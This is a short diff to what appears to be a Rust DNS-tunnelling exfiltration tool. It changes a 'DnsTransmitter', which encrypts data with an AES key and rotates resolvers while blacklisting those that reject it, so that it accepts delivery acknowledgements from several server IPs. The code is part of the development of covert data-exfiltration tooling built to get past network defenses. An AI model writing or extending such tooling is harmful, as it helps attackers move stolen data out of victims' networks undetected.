@@ -8,7 +8,7 @@ use crate::metadata::ExfilSession;
 use crate::resolver::ResolverPool;
 use anyhow::{anyhow, Context, Result};
 use rand::Rng;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::convert::TryInto;
 use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
 use std::time::{Duration, Instant};
@@ -33,7 +33,7 @@ pub struct DnsTransmitter {
     pool: ResolverPool,
     aes_key: [u8; 32],
     last_domain: Option<String>,
-    ack_next: Ipv4Addr,
+    ack_next: HashSet<Ipv4Addr>,
     resolver_blacklist: HashMap<SocketAddr, Instant>,
     resolver_rejects: HashMap<SocketAddr, u32>,
 }
@@ -41,11 +41,18 @@ pub struct DnsTransmitter {
 impl DnsTransmitter {
     pub fn new(cfg: Config, pool: ResolverPool) -> Self {
         let aes_key = derive_key(&cfg.encryption_key);
-        let ack_ip = cfg
-            .server_ip()
-            .parse::<Ipv4Addr>()
-            .unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1));
-        let ack_next = increment_ip(ack_ip);
+        let mut ack_next = HashSet::new();
+
+        for ip_str in cfg.server_ips() {
+            if let Ok(ip) = ip_str.parse::<Ipv4Addr>() {
+                ack_next.insert(increment_ip(ip));
+            }
+        }
+
+        if ack_next.is_empty() {
+            ack_next.insert(increment_ip(Ipv4Addr::new(127, 0, 0, 1)));
+        }
+
         Self {
             cfg,
             pool,
@@ -160,7 +167,7 @@ impl DnsTransmitter {
                 _ => None,
             });
 
-        Ok(matches!(ack, Some(ip) if ip == self.ack_next))
+        Ok(matches!(ack, Some(ip) if self.ack_next.contains(&ip)))
     }
 
     fn build_name(&mut self, labels: &[String]) -> Result<Name> {
